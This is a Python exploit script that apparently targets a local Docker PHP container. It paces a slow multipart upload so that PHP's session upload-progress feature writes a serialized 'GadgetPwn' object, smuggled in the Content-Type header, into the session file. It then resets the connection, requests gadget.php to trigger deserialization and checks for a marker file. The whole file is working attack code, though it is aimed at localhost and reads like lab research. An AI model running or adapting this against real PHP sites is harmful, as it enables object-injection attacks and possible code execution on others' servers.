#!/usr/bin/env python3
"""up6: live observation of the sess file DURING a slow upload.
- paced upload (CL=100M, 64KB/0.12s) with payload Content-Type
- poll /tmp/sess_<SID> every 0.5s via docker exec (size + hex head)
- RST at ~2M, keep polling 5s
- then GET /gadget.php, check /tmp/x_gadget, tail error log for decode warnings
"""
import socket, subprocess, threading, urllib.request, uuid, time

HOST, PORT = "127.0.0.1", 8086
SID = uuid.uuid4().hex
P = "u6"
CT = 'x|O:9:"GadgetPwn":0:{}|'
stop = False

def poll():
    n = 0
    while not stop:
        r = subprocess.run(["docker", "exec", "php_up", "sh", "-c",
            "if [ -f /tmp/sess_%s ]; then wc -c < /tmp/sess_%s; head -c 160 /tmp/sess_%s | od -c | head -6; else echo MISSING; fi" % (SID, SID, SID)],
            capture_output=True, timeout=15)
        out = r.stdout.decode("latin1", "replace").replace("\n", " | ")[:260]
        print("  t=%4.1f  %s" % (n*0.5, out), flush=True)
        n += 1
        time.sleep(0.5)

body_head = (
    "------up6\r\n"
    "Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n"
    + P + "\r\n"
    "------up6\r\n"
    "Content-Disposition: form-data; name=\"f\"; filename=\"ok.txt\"\r\n"
    "Content-Type: " + CT + "\r\n\r\n"
).encode("latin1")
TOTAL = 100_000_000
req = (
    "POST /target.php HTTP/1.1\r\n"
    "Host: 127.0.0.1:8086\r\n"
    "Cookie: PHPSESSID=" + SID + "\r\n"
    "Content-Type: multipart/form-data; boundary=----up6\r\n"
    "Content-Length: " + str(len(body_head) + TOTAL) + "\r\n"
    "\r\n"
).encode()

print("SID", SID, flush=True)
t = threading.Thread(target=poll, daemon=True)
t.start()

s = socket.create_connection((HOST, PORT), timeout=30)
s.sendall(req + body_head)
pad = b"P" * 65536
sent = 0
while sent < 2_000_000:
    s.sendall(pad); sent += len(pad)
    time.sleep(0.12)
s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, b"\x01\x00\x00\x00\x00\x00\x00\x00")
s.close()
print("RST sent at", sent, "bytes; watching 5s more...", flush=True)
time.sleep(5)
stop = True
time.sleep(0.7)

rq = urllib.request.Request("http://127.0.0.1:8086/gadget.php",
                            headers={"Cookie": "PHPSESSID=" + SID})
try:
    with urllib.request.urlopen(rq, timeout=60) as r:
        print("B:", r.status, flush=True)
        print(r.read().decode("latin1", "replace")[:500], flush=True)
except Exception as e:
    print("B: ERR", str(e)[:200], flush=True)

xg = subprocess.run(["docker", "exec", "php_up", "sh",
    "-c", "cat /tmp/x_gadget 2>/dev/null || echo NO_XG"], capture_output=True, timeout=20)
print("x_gadget:", xg.stdout.decode("latin1", "replace").strip(), flush=True)
r = subprocess.run(["docker", "logs", "--tail", "8", "php_up"], capture_output=True, timeout=20)
print("--- logs ---", flush=True)
print((r.stdout + r.stderr).decode("latin1", "replace"), flush=True)
